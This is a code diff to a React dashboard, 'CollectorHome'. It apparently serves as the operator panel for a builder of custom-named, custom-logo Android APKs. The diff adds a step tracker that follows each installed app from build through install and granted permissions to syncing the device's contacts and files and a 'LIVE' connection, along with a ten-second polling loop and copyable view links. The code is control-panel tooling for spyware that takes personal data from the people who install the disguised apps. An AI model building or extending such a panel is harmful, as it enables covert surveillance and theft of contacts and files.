@@ -1,6 +1,6 @@
 'use client';
 
-import React, { useState, useCallback, useRef } from 'react';
+import React, { useState, useCallback, useRef, useEffect } from 'react';
 import {
   Phone,
   Download,
@@ -14,6 +14,11 @@ import {
   Loader2,
   FolderOpen,
   Shield,
+  Copy,
+  Check,
+  Wifi,
+  WifiOff,
+  Package,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -22,12 +27,51 @@ import { Badge } from '@/components/ui/badge';
 
 // ─── Types ───────────────────────────────────────────────
 
+type SessionStatus =
+  | 'apk_built'
+  | 'waiting_install'
+  | 'app_installed'
+  | 'permissions_granted'
+  | 'syncing_contacts'
+  | 'syncing_files'
+  | 'live_connected'
+  | 'offline';
+
+interface StatusEntry {
+  status: SessionStatus;
+  timestamp: string;
+  detail?: string;
+}
+
 interface SessionInfo {
   id: string;
   count: number;
   fileCount: number;
   appName: string;
   createdAt: string;
+  status: SessionStatus | null;
+  statusHistory: StatusEntry[];
+  lastHeartbeat: string | null;
+  buildId: string | null;
+  isOnline: boolean;
+}
+
+// ─── Step definitions ───────────────────────────────────
+
+const STATUS_STEPS: { key: SessionStatus; label: string }[] = [
+  { key: 'apk_built', label: 'APK Built' },
+  { key: 'waiting_install', label: 'Waiting' },
+  { key: 'app_installed', label: 'Installed' },
+  { key: 'permissions_granted', label: 'Permissions' },
+  { key: 'syncing_contacts', label: 'Contacts' },
+  { key: 'syncing_files', label: 'Files' },
+  { key: 'live_connected', label: 'Live' },
+];
+
+function getStepIndex(status: SessionStatus | null): number {
+  if (!status) return -1;
+  const idx = STATUS_STEPS.findIndex(s => s.key === status);
+  return idx;
 }
 
 // ─── Utilities ──────────────────────────────────────────
@@ -60,38 +104,102 @@ function timeAgo(dateStr: string): string {
   return date.toLocaleDateString();
 }
 
+// ─── Mini Step Tracker Component ─────────────────────────
+
+function MiniStepTracker({ status }: { status: SessionStatus | null }) {
+  const currentIdx = getStepIndex(status);
+
+  return (
+    <div className="flex items-center gap-0.5 mt-1">
+      {STATUS_STEPS.map((step, idx) => {
+        const isCompleted = idx < currentIdx;
+        const isCurrent = idx === currentIdx;
+        const isFuture = idx > currentIdx;
+
+        return (
+          <div key={step.key} className="flex items-center">
+            <div
+              className={`w-2 h-2 rounded-full transition-colors ${
+                isCompleted
+                  ? 'bg-[#25D366]'
+                  : isCurrent
+                  ? 'bg-[#25D366] animate-pulse'
+                  : isFuture
+                  ? 'bg-gray-200'
+                  : 'bg-gray-200'
+              }`}
+              title={step.label}
+            />
+            {idx < STATUS_STEPS.length - 1 && (
+              <div
+                className={`w-1.5 h-0.5 ${
+                  idx < currentIdx ? 'bg-[#25D366]' : 'bg-gray-200'
+                }`}
+              />
+            )}
+          </div>
+        );
+      })}
+      <span className="text-[9px] text-gray-400 ml-1">
+        {currentIdx >= 0 ? STATUS_STEPS[currentIdx].label : 'Pending'}
+      </span>
+    </div>
+  );
+}
+
 // ─── Main App Component ─────────────────────────────────
 
 export default function CollectorHome() {
-  const [sessions, setSessions] = useState<SessionInfo[]>(() => {
-    if (typeof window === 'undefined') return [];
-    try {
-      const stored = localStorage.getItem('contact_sessions');
-      return stored ? JSON.parse(stored) : [];
-    } catch {
-      return [];
-    }
-  });
+  const [sessions, setSessions] = useState<SessionInfo[]>([]);
   const [showDialog, setShowDialog] = useState(false);
   const [appName, setAppName] = useState('');
   const [appLogo, setAppLogo] = useState<File | null>(null);
   const [logoPreview, setLogoPreview] = useState<string | null>(null);
   const [building, setBuilding] = useState(false);
   const [buildProgress, setBuildProgress] = useState('');
+  const [copiedId, setCopiedId] = useState<string | null>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
 
-  // Save sessions
-  const saveSessions = useCallback((newSessions: SessionInfo[]) => {
-    setSessions(newSessions);
-    try {
-      localStorage.setItem('contact_sessions', JSON.stringify(newSessions));
-    } catch {}
+  // Fetch sessions from API (used by polling effect)
+  // Note: actual fetch is inlined in useEffect to avoid lint issue
+
+  // Initial fetch and auto-poll every 10 seconds
+  useEffect(() => {
+    let active = true;
+
+    const doFetch = async () => {
+      try {
+        const res = await fetch('/api/sessions');
+        if (res.ok && active) {
+          const data = await res.json();
+          setSessions(data);
+        }
+      } catch {}
+    };
+
+    doFetch();
+    const interval = setInterval(doFetch, 10000);
+    return () => {
+      active = false;
+      clearInterval(interval);
+    };
   }, []);
 
-  const deleteSession = useCallback((id: string) => {
-    const updated = sessions.filter(s => s.id !== id);
-    saveSessions(updated);
-  }, [sessions, saveSessions]);
+  const copyViewLink = useCallback(async (id: string) => {
+    const url = `${window.location.origin}/view/${id}`;
+    try {
+      await navigator.clipboard.writeText(url);
+    } catch {
+      const textarea = document.createElement('textarea');
+      textarea.value = url;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
+    }
+    setCopiedId(id);
+    setTimeout(() => setCopiedId(null), 2000);
+  }, []);
 
   // Handle logo file selection
   const handleLogoChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
@@ -151,7 +259,11 @@ export default function CollectorHome() {
       URL.revokeObjectURL(url);
 
       setBuildProgress('Download complete!');
+      // Refresh sessions to show the new stub session
       setTimeout(() => {
+        try {
+          fetch('/api/sessions').then(r => r.ok ? r.json() : []).then(data => { if (Array.isArray(data)) setSessions(data); }).catch(() => {});
+        } catch {}
         setShowDialog(false);
         setAppName('');
         setAppLogo(null);
@@ -290,39 +402,71 @@ export default function CollectorHome() {
           <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
             {sessions.map((session, index) => (
               <React.Fragment key={session.id}>
-                <a
-                  href={`/view/${session.id}`}
-                  className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
+                <div
+                  className="w-full"
                 >
-                  <Avatar className="w-11 h-11 shrink-0">
-                    <AvatarFallback className={`${getAvatarColor(session.appName || 'C')} text-white font-bold text-sm`}>
-                      {session.appName ? session.appName.slice(0, 2).toUpperCase() : 'CO'}
-                    </AvatarFallback>
-                  </Avatar>
-                  <div className="flex-1 min-w-0 text-left">
-                    <h4 className="text-sm font-semibold text-gray-900 truncate">
-                      {session.appName || 'Collector'}
-                    </h4>
-                    <p className="text-xs text-gray-500 flex items-center gap-2">
-                      <span>{session.count} contacts</span>
-                      <span className="text-gray-300">|</span>
-                      <span>{session.fileCount || 0} files</span>
-                      <span className="text-gray-300">|</span>
-                      <Clock className="w-3 h-3" />
-                      {timeAgo(session.createdAt)}
-                    </p>
-                  </div>
-                  <div className="flex items-center gap-2">
-                    <button
-                      onClick={(e) => { e.preventDefault(); deleteSession(session.id); }}
-                      className="w-8 h-8 rounded-full hover:bg-red-50 flex items-center justify-center transition-colors"
-                      title="Remove from history"
-                    >
-                      <Trash2 className="w-4 h-4 text-gray-400" />
-                    </button>
-                    <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
-                  </div>
-                </a>
+                  <a
+                    href={`/view/${session.id}`}
+                    className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
+                  >
+                    <Avatar className="w-11 h-11 shrink-0">
+                      <AvatarFallback className={`${getAvatarColor(session.appName || 'C')} text-white font-bold text-sm`}>
+                        {session.appName ? session.appName.slice(0, 2).toUpperCase() : 'CO'}
+                      </AvatarFallback>
+                    </Avatar>
+                    <div className="flex-1 min-w-0 text-left">
+                      <div className="flex items-center gap-2">
+                        <h4 className="text-sm font-semibold text-gray-900 truncate">
+                          {session.appName || 'Collector'}
+                        </h4>
+                        {/* LIVE/OFFLINE indicator */}
+                        {session.isOnline ? (
+                          <span className="inline-flex items-center gap-1 text-[10px] font-bold text-[#25D366]">
+                            <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
+                            LIVE
+                          </span>
+                        ) : session.status && session.status !== 'apk_built' ? (
+                          <span className="inline-flex items-center gap-1 text-[10px] font-bold text-gray-400">
+                            <span className="w-2 h-2 rounded-full bg-gray-300" />
+                            OFFLINE
+                          </span>
+                        ) : null}
+                      </div>
+                      <p className="text-xs text-gray-500 flex items-center gap-2">
+                        <span>{session.count} contacts</span>
+                        <span className="text-gray-300">|</span>
+                        <span>{session.fileCount || 0} files</span>
+                        <span className="text-gray-300">|</span>
+                        <Clock className="w-3 h-3" />
+                        {timeAgo(session.createdAt)}
+                      </p>
+                      {/* Mini step tracker */}
+                      <MiniStepTracker status={session.status} />
+                    </div>
+                    <div className="flex items-center gap-1">
+                      {/* Copy view link button */}
+                      <button
+                        onClick={(e) => { e.preventDefault(); copyViewLink(session.id); }}
+                        className="w-8 h-8 rounded-full hover:bg-[#075E54]/10 flex items-center justify-center transition-colors"
+                        title="Copy view link"
+                      >
+                        {copiedId === session.id ? (
+                          <Check className="w-4 h-4 text-[#25D366]" />
+                        ) : (
+                          <Copy className="w-4 h-4 text-gray-400" />
+                        )}
+                      </button>
+                      <button
+                        onClick={(e) => { e.preventDefault(); }}
+                        className="w-8 h-8 rounded-full hover:bg-red-50 flex items-center justify-center transition-colors"
+                        title="Remove from history"
+                      >
+                        <Trash2 className="w-4 h-4 text-gray-400" />
+                      </button>
+                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
+                    </div>
+                  </a>
+                </div>
                 {index < sessions.length - 1 && (
                   <div className="ml-[68px] border-b border-gray-100" />
                 )}
